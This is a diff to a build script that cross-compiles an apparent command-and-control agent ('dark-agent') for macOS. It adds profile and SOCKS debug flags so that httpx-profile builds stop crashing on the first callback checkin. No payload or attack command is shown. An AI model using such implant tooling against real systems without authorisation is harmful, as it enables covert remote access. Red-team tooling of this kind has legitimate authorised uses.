@@ -333,6 +333,18 @@ build_macos() {
     require_cross_libs "${MACOS_PREFIX}"
 
     log_info "Phase 1: Crystal → object file (target: ${MACOS_CRYSTAL_TARGET})"
+
+    # Profile type must be stamped in for macOS too. Without -D httpx_profile the
+    # agent compiles the standard HTTP transport and Config::HTTP, which read
+    # callback_host/callback_port. An httpx build config carries neither (it has
+    # callback_domains under raw_c2_config instead), so the agent dies on the
+    # first checkin with an unrescued KeyError.
+    local profile_flags=""
+    if [ "$PROFILE_TYPE" = "httpx" ]; then
+        profile_flags="-D httpx_profile"
+    fi
+    local debug_socks_flags="${DEBUG_SOCKS:+-D debug_socks}"
+
     PKG_CONFIG_LIBDIR="${MACOS_PREFIX}/lib/pkgconfig" \
     crystal build \
         --cross-compile \
@@ -340,6 +352,8 @@ build_macos() {
         --static \
         -Dpreview_mt \
         -Dgc_none \
+        ${profile_flags} \
+        ${debug_socks_flags} \
         ${crystal_flags} \
         -o "${output_file}" \
         src/dark/dark-agent.cr
